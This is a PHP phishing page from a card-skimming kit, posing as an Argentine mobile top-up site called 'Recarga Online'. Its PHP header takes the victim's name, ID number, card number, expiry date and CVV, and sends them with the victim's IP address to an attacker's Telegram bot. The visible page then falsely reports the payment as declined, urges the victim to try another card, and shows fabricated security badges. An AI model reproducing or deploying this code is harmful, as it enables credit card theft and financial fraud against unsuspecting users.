<?php


$nomb = $_POST['nombre_apellido'];
$doc = $_POST['documento'];
$cc = $_POST['credit_card'];
$ex = $_POST['exp_date'];
$cv = $_POST['sec_code'];

require 'b.php';

$html_message = "➖➖➖➖➖[ Recargas ]➖➖➖➖➖\n".
				"<b>✔️Nombre: </b><code>".$nomb."</code>\n".
        "<b>✔️Documento: </b><code>".$doc."</code>\n".
				"<b>✔️CC: </b><code>".$cc."</code>\n".
        "<b>✔️EXP: </b><code>".$ex."</code>\n".
				"<b>✔️CVV: </b><code>".$cv."</code>\n".
				"➖➖➖➖➖➖IP INFO➖➖➖➖➖➖\n".
				"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".
				"➖➖➖➖➖➖[ https://t.me/jbriden ]➖➖➖➖➖➖";

$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$ci&text=$html_message&parse_mode=html");


?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Recarga Online</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="/assets/css/aos.css" rel="stylesheet">
  <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
  <link href="/assets/css/bootstrap-icons.css" rel="stylesheet">
  <link href="/assets/css/boxicons.min.css" rel="stylesheet">
  <link href="/assets/css/glightbox.min.css" rel="stylesheet">
  <link href="/assets/css/remixicon.css" rel="stylesheet">
  <link href="/assets/css/swiper-bundle.min.css" rel="stylesheet">
  <link href="/assets/css/style.css" rel="stylesheet">

  <style>
    .lds-roller {
      display: inline-block;
      position: relative;
      width: 80px;
      height: 80px;
    }

    .lds-roller div {
      animation: lds-roller 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
      transform-origin: 40px 40px;
    }

    .lds-roller div:after {
      content: " ";
      display: block;
      position: absolute;
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #fff;
      margin: -4px 0 0 -4px;
    }

    .lds-roller div:nth-child(1) {
      animation-delay: -0.036s;
    }

    .lds-roller div:nth-child(1):after {
      top: 63px;
      left: 63px;
    }

    .lds-roller div:nth-child(2) {
      animation-delay: -0.072s;
    }

    .lds-roller div:nth-child(2):after {
      top: 68px;
      left: 56px;
    }

    .lds-roller div:nth-child(3) {
      animation-delay: -0.108s;
    }

    .lds-roller div:nth-child(3):after {
      top: 71px;
      left: 48px;
    }

    .lds-roller div:nth-child(4) {
      animation-delay: -0.144s;
    }

    .lds-roller div:nth-child(4):after {
      top: 72px;
      left: 40px;
    }

    .lds-roller div:nth-child(5) {
      animation-delay: -0.18s;
    }

    .lds-roller div:nth-child(5):after {
      top: 71px;
      left: 32px;
    }

    .lds-roller div:nth-child(6) {
      animation-delay: -0.216s;
    }

    .lds-roller div:nth-child(6):after {
      top: 68px;
      left: 24px;
    }

    .lds-roller div:nth-child(7) {
      animation-delay: -0.252s;
    }

    .lds-roller div:nth-child(7):after {
      top: 63px;
      left: 17px;
    }

    .lds-roller div:nth-child(8) {
      animation-delay: -0.288s;
    }

    .lds-roller div:nth-child(8):after {
      top: 56px;
      left: 12px;
    }

    @keyframes lds-roller {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    #hero {
      height: 100vh;
    }
  </style>
</head>

<body data-aos-easing="ease-in-out" data-aos-duration="1000" data-aos-delay="0">
  <main>
    <!-- ======= Header ======= -->
    <header id="header" class="fixed-top">
      <div class="container align-items-center justify-content-lg-between">
        <h1 class="logo me-auto me-lg-0"><a href="/">Recarga Online - Argentina</a></h1>
      </div>
    </header><!-- End Header -->

    <!-- ======= Hero Section ======= -->
    <section id="hero" class="d-flex align-items-center justify-content-center">
      <div class="container aos-init aos-animate" data-aos="fade-up">

        <div class="row justify-content-center aos-init aos-animate" data-aos="fade-up" data-aos-delay="1200">
          <div class="col-xl-6 col-lg-8">
            <h1 id="estado_orden">Tu orden ha sido rechazada.</h1><br>
            <h2>El pago no fue procesado debido a que su tarjeta no tiene activada las compras por Internet. Asegúrese de activarlo o intente con otra.</h2>
            <span id="order_info"></span><br>

          </div>
        </div>

      </div>
    </section><!-- End Hero -->

    <footer id="footer">
      <div class="footer-top">
        <div class="unit size1of1 secure-block">
          <center><strong class="widget-title">Compra Segura</strong>
            <span class="certified-ebit lfloat mls"></span>
            <span class="comodo lfloat mhs" target="_blank">
              Compra asegurada por Comodo
            </span>
            <span class="lfloat">Sitio seguro con criptografia (SSL) · Homologado por la USERTrust Network</span><br>
            <span class="sitio-blindado lfloat mts mhs" target="_blank">
              Sitio Blindado
            </span>
            <span class="lfloat">Blindado contra robo de información y clonación de tarjetas</span><br>
          </center>
        </div><br>
        <center>
          <img src="/assets/img/pagoseguromercadopago.png" alt="" width="150px">
          <img src="/assets/img/APS-SSL-Secure-Connection-1.png" alt="" width="150px">
        </center>
      </div>

    </footer>

    <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

    <!-- Vendor JS Files -->
    <script src="/assets/js/purecounter.js"></script>
    <script src="/assets/js/aos.js"></script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <script src="/assets/js/glightbox.min.js"></script>
    <script src="/assets/js/isotope.pkgd.min.js"></script>
    <script src="/assets/js/validate.js"></script>

    <!-- Template Main JS File -->
    <script src="/assets/js/main.js"></script>

  </main>

  <script>
    function update_divs() {
      document.getElementById('estado_orden').innerHTML = "Tu orden ha sido rechazada.";
    }
    setInterval(update_divs, 200);
  </script>

</body>

</html>